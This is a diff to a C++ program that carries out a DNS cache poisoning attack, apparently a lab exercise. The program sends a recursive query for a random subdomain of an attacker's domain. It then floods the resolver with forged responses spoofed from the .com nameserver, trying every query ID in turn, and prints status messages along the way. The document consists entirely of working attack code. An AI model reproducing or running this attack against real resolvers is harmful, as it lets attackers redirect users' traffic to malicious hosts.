@@ -26,20 +26,28 @@ int main() {
     queryName.append(".");
     queryName.append(ATTACKING_DOMAIN);
 
-    // Send a DNS query to the victim
+    // Create the DNS query packet to send to the victim
+    // That will trigger the recursive requests
     DNS dns_request;
     dns_request.type(DNS::QUERY);
     dns_request.id(1234);
     dns_request.recursion_desired(1);
 
+    // IP of {random}.example.com?
     DNS::query dns_query(queryName, DNS::A, DNS::IN);
     dns_request.add_query(dns_query);
 
+    std::cout << "Sending DNS request for host " << queryName << " to trigger the recursive requests..." << std::endl;
+
+    // Send the packet
     IP query_pkt = IP(RECURSIVE_DNS, VICTIM_IP) / UDP(53, 1234) / dns_request;
     sender.send(query_pkt);
 
+    std::cout << "Trying all possible query IDs..." << std::endl;
+
+    // Try all possible query IDs
     for(unsigned int query_id = MIN_QUERY_ID; query_id < MAX_QUERY_ID; query_id++) {
-        // Send a DNS response to the authoritative server
+        // Send a DNS response to the recursive DNS, coming from <REDACTED>
         DNS dns_response;
         dns_response.type(DNS::RESPONSE);
         dns_response.id(query_id);
@@ -54,6 +62,10 @@ int main() {
         IP resp_pkt = IP(RECURSIVE_DNS, COM_DNS) / UDP(33333, 53) / dns_response;
         sender.send(resp_pkt);
     }
+
+    std::cout << "Done trying all possible query IDs, check if the attack has succeded :)" << std::endl;
+
+    return 0;
 }
 
 std::string generateRandomString(size_t size) {
